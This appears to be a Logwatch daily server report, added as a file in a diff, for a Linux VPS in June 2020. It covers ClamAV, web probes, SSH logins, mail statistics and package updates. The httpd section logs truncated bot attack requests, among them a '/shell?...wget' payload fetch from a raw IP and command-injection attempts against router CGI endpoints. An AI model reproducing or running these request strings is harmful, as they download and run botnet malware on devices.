@@ -1,0 +1,161 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id C36B79F20478; Mon, 15 Jun 2020 03:25:18 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20200615012518.C36B79F20478@hrankiety.pl>
+Date: Mon, 15 Jun 2020 03:25:07 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Mon Jun 15 03:25:07 2020
+        Date Range Processed: yesterday
+                              ( 2020-Jun-14 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Sun Jun 14 03:26:15 2020
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.100.3 Recommended version: 0.102.3
+    DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav
+    main.cld is up to date (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)
+    Downloading daily-25842.cdiff [100%]
+    daily.cld updated (version: 25842, sigs: 2613060, f-level: 63, builder: raynman)
+    Can't query daily.25842.93.1.0.6810DB54.ping.clamav.net
+    bytecode.cld is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)
+    Database updated (7178056 signatures) from db.local.clamav.net (IP: 104.16.219.84)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 3 sites probed the server 
+    18.209.109.122
+    185.202.2.147
+    209.150.49.198
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 16 Time(s)
+       /boaform/admin/formPing: 1 Time(s)
+       /cgi-bin/login_mgr.cgi?C1=ON&cmd=login&f_t ... h%26chmod%26777: 1 Time(s)
+       null: 2 Time(s)
+    404 Not Found
+       /0bef: 1 Time(s)
+       /GponForm/diag_Form?style/: 1 Time(s)
+       /Telerik.Web.UI.WebResource.axd?type=rau: 1 Time(s)
+       /WSMAN: 1 Time(s)
+       /admin//config.php: 1 Time(s)
+       /adv,/cgi-bin/weblogin.cgi?username=admin% ... 3&password=asdf: 1 Time(s)
+       /async/: 1 Time(s)
+       /boaform/admin/formLogin: 2 Time(s)
+       /cgi-bin/config.exp: 1 Time(s)
+       /cgi-bin/mainfunction.cgi: 2 Time(s)
+       /manager/html: 1 Time(s)
+       /phpmyadmin/: 1 Time(s)
+       /portal/redlion: 1 Time(s)
+       /shell?cd+/tmp;rm+-rf+*;wget+37.49.224.183 ... m7+jaws.selfrep: 1 Time(s)
+       /wp-login.php: 2 Time(s)
+    408 Request Timeout
+       null: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- pam_unix Begin ------------------------ 
+
+ su:
+    Sessions Opened:
+       btertil -> root: 1 Time(s)
+ 
+ 
+ ---------------------- pam_unix End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+       19   *Warning: Pre-queue content-filter connection overload 
+    26824   SASL authentication failed 
+       42   Miscellaneous warnings 
+ 
+  363.153K  Bytes accepted                           371,869
+  354.579K  Bytes delivered                          363,089
+ ========   ================================================
+ 
+       22   Accepted                                 100.00%
+ --------   ------------------------------------------------
+       22   Total                                    100.00%
+ ========   ================================================
+ 
+    26899   Connections made      
+       10   Connections lost      
+    26898   Disconnections        
+       22   Removed from queue    
+       18   Delivered             
+        4   Bounce (remote)       
+        2   DSNs undeliverable    
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+       89.77.70.146 (89-77-70-146.dynamic.chello.pl): 1 time
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 3 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- yum Begin ------------------------ 
+
+ 
+ Packages Installed:
+    kernel-2.6.32-754.30.2.el6.i686
+    fail2ban-0.8.8-2.el6.noarch
+ 
+ Packages Updated:
+    32:bind-9.8.2-0.68.rc1.el6_10.7.i686
+    kernel-firmware-2.6.32-754.30.2.el6.noarch
+    kernel-headers-2.6.32-754.30.2.el6.i686
+    fail2ban-0.9.6-1.el6.1.noarch
+    32:bind-libs-9.8.2-0.68.rc1.el6_10.7.i686
+ 
+ ---------------------- yum End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   28G   23G  56% /
+ none            1.0G  4.0K  1.0G   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
